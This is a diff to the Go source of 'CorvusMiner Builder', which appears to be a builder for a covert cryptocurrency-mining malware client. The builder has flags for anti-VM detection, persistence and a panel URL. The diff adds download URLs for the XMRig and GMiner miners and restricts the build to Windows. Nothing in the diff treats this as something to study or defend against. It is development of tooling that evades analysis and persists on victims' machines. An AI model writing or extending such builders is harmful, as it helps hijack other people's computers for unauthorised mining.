@@ -6,7 +6,6 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
-	"runtime"
 )
 
 // Directories
@@ -26,6 +25,8 @@ var (
 	antiVMFlag      = flag.Bool("antivm", false, "Enable anti-VM detection")
 	persistenceFlag = flag.Bool("persistence", false, "Enable persistence")
 	outputFlag      = flag.String("output", "", "Output directory for the built binary")
+	xmrigURLFlag    = flag.String("xmrig-url", "http://127.0.0.1:8080/api/miner/xmrig", "Download URL for XMRig miner")
+	gminerURLFlag   = flag.String("gminer-url", "http://127.0.0.1:8080/api/miner/gminer", "Download URL for GMiner miner")
 )
 
 func init() {
@@ -72,36 +73,19 @@ func findClientDir() string {
 func main() {
 	flag.Parse()
 
-	logInfo("CorvusMiner Builder - Detected OS: %s", runtime.GOOS)
+	logInfo("CorvusMiner Builder - Windows Platform")
 
 	// If flags are provided, use non-interactive mode
 	if *panelURLFlag != "" {
-		if runtime.GOOS == "windows" {
-			if err := buildClientNonInteractiveWindows(); err != nil {
-				logError("Build failed: %v", err)
-				os.Exit(1)
-			}
-		} else if runtime.GOOS == "linux" {
-			if err := buildClientNonInteractive(); err != nil {
-				logError("Build failed: %v", err)
-				os.Exit(1)
-			}
-		} else {
-			logError("Unsupported OS: %s", runtime.GOOS)
+		if err := buildClientNonInteractiveWindows(); err != nil {
+			logError("Build failed: %v", err)
 			os.Exit(1)
 		}
 		return
 	}
 
 	// Otherwise, use interactive mode
-	if runtime.GOOS == "windows" {
-		windowsMain()
-	} else if runtime.GOOS == "linux" {
-		linuxMain()
-	} else {
-		logError("Unsupported OS: %s. Supported: windows, linux", runtime.GOOS)
-		os.Exit(1)
-	}
+	windowsMain()
 }
 
 // Logging utilities
